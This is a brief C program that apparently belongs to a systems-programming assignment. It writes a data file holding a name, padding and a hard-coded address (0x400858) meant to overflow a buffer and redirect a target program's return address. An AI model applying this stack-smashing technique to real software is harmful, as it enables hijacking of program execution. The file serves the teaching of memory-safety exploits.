/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Richard Gomez                                              */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>

int main(void) {
    unsigned long bAddress;
    int i;
    FILE *psFile;
    psFile = fopen("dataB", "w");

    fprintf(psFile, "Richard Gomez");
    putc('\0', psFile);
    fprintf(psFile, "0000000000000000000000000000000000");
    /* for(i = 0; i < 35; i++) {
        putc('\0', psFile);
    } */
    bAddress = 0x400858;
    fwrite(&bAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}

